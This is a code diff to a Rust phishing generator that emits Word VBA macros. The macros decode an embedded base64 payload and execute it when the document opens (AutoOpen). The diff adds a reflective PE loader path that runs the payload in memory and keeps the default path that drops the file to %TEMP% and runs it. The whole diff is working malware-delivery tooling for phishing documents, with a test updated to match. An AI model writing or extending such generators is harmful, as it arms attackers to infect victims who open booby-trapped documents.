@@ -47,7 +47,7 @@ impl PhishingGenerator {
         )
     }
 
-    pub fn generate_macro_vba(payload: &[u8]) -> String {
+    pub fn generate_macro_vba(payload: &[u8], method: &str) -> String {
         let b64 = general_purpose::STANDARD.encode(payload);
         let mut chunks = String::new();
         
@@ -56,8 +56,43 @@ impl PhishingGenerator {
             chunks.push_str(&format!("    payload = payload & \"{}\"\n", s));
         }
 
-        format!(
-            r#"
+        if method == "memory" {
+            // Memory Execution (Reflective PE Loader)
+            let loader = crate::builder::vba_pe_loader::VBA_PE_LOADER_TEMPLATE;
+            format!(
+                r#"
+Sub AutoOpen()
+    Dim payload As String
+    payload = ""
+{}
+    
+    Dim bytes() As Byte
+    bytes = DecodeBase64(payload)
+    
+    ' Execute in memory
+    PELoader bytes
+End Sub
+
+{}
+
+Function DecodeBase64(ByVal strData As String) As Byte()
+    Dim objXML As Object
+    Dim objNode As Object
+    Set objXML = CreateObject("MSXML2.DOMDocument")
+    Set objNode = objXML.createElement("b64")
+    objNode.DataType = "bin.base64"
+    objNode.Text = strData
+    DecodeBase64 = objNode.nodeTypedValue
+    Set objNode = Nothing
+    Set objXML = Nothing
+End Function
+"#,
+                chunks, loader
+            )
+        } else {
+            // Drop and Execute (Default)
+            format!(
+                r#"
 Sub AutoOpen()
     Dim payload As String
     payload = ""
@@ -94,8 +129,9 @@ Function DecodeBase64(ByVal strData As String) As Byte()
     Set objXML = Nothing
 End Function
 "#,
-            chunks
-        )
+                chunks
+            )
+        }
     }
 }
 
@@ -115,7 +151,7 @@ mod tests {
     #[test]
     fn test_macro_vba_generation() {
         let payload = b"\x90\x90";
-        let vba = PhishingGenerator::generate_macro_vba(payload);
+        let vba = PhishingGenerator::generate_macro_vba(payload, "drop");
         assert!(vba.contains("DecodeBase64"));
         assert!(vba.contains("Environ(\"TEMP\")"));
         // Base64 of 0x9090 is kJA=
